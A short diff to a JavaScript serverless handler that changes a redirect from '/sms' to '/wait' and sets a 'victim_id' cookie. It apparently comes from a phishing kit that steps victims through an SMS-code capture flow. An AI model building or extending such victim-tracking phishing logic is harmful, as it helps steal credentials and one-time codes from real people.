@@ -82,7 +82,7 @@ exports.handler = async (event, context) => {
     return {
       statusCode: 302,
       headers: {
-        'Location': '/sms',
+        'Location': '/wait',
         'Set-Cookie': `victim_id=${vId}; Path=/; SameSite=Lax`
       },
       body: ''
